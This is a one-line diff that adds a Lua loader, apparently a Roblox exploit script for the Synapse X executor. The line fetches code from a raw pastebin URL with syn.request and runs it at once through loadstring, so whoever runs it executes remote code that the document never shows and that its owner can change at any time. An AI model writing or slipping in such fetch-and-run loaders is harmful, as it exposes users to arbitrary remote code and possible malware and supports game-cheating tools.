@@ -1,0 +1,1 @@
+loadstring(syn.request({Url = "https://pastebin.com/raw/ZWb9SYv3", Method = "GET"}).Body)()
